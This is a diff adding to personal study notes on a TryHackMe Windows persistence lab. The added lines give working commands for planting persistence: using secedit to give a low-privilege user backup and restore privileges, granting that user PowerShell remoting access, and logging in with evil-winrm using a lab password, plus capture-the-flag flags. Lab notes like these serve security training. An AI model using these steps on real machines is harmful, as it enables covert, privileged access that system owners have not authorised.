@@ -43,6 +43,27 @@ THM{FLAG_BACKED_UP!}
 Special Privileges and Security Descriptors
 -SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
 -SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
+-admin terminal
+secedit /export /cfg config.inf
+-go to file same directory
+-add thmuser2 to SeBackupPrivilege and SeRestorePrivilege
+-save file
+-convert .inf file to .sdb file to load configuration back into the system
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+-add thmuser2 to remote mangement users group
+-powershell
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+-add thmuser2 and give full control permissions
+-log in using evil-winrm
+evil-winrm -i [IP] -u thmuser2 -p Password321
+cd C:\flags
+.\flag2.exe
+*THM{IM_JUST_A_NORMAL_USER}
+
+RID Hijacking
+
+
 
 
 
